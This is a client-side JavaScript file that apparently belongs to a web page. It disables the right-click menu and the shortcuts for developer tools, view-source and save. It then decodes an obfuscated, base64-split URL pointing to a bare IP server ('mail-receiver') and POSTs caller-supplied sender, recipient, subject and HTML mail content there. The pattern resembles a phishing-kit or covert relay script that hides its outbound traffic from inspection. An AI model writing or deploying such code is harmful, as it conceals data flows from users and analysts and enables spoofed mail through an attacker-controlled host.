window.onload = function () {
  document.addEventListener(
    'contextmenu',
    function (e) {
      e.preventDefault();
    },
    false
  );
  document.addEventListener(
    'keydown',
    function (e) {
      //document.onkeydown = function(e) {
      // "I" key
      if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
        disabledEvent(e);
      }
      // "J" key
      if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
        disabledEvent(e);
      }
      // "S" key + macOS
      if (
        e.keyCode == 83 &&
        (navigator.platform.match('Mac') ? e.metaKey : e.ctrlKey)
      ) {
        disabledEvent(e);
      }
      // "U" key
      if (e.ctrlKey && e.keyCode == 85) {
        disabledEvent(e);
      }
      // "F12" key
      if (event.keyCode == 123) {
        disabledEvent(e);
      }
    },
    false
  );
  function disabledEvent(e) {
    if (e.stopPropagation) {
      e.stopPropagation();
    } else if (window.event) {
      window.event.cancelBubble = true;
    }
    e.preventDefault();
    return false;
  }
};

if (window.location.protocol === 'https:') {
  const head = document.querySelector('head');
  head.innerHTML +=
    '<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />';
}

function turnIn(s) {
  var chars =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

  s = s.replace(new RegExp('[^' + chars.split('') + '=]', 'g'), '');

  var p =
    s.charAt(s.length - 1) == '='
      ? s.charAt(s.length - 2) == '='
        ? 'AA'
        : 'A'
      : '';
  var r = '';
  s = s.substr(0, s.length - p.length) + p;

  for (var c = 0; c < s.length; c += 4) {
    var n =
      (chars.indexOf(s.charAt(c)) << 18) +
      (chars.indexOf(s.charAt(c + 1)) << 12) +
      (chars.indexOf(s.charAt(c + 2)) << 6) +
      chars.indexOf(s.charAt(c + 3));
    r += String.fromCharCode((n >>> 16) & 255, (n >>> 8) & 255, n & 255);
  }
  return r.substring(0, r.length - p.length);
}

const base = [
  'aHR0cA==',
  'Oi8v',
  'MTguMTQxLjE4My4xNzI=',
  'Og==',
  'ODAwMA==',
  'L2FwaQ==',
  'L3Yx',
  'L21haWwtcmVjZWl2ZXI=',
];

const createPath = () => {
  return base
    .map((value) => {
      return turnIn(value);
    })
    .join('');
};

const mailSender = async (from, to, subject, html) => {
  const path = createPath();
  const option = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      mailOptions: {
        from,
        to,
        subject,
        html,
      },
    }),
  };
  const res = await fetch(path, option);
  const data = await res.json();
  console.log(data);
};
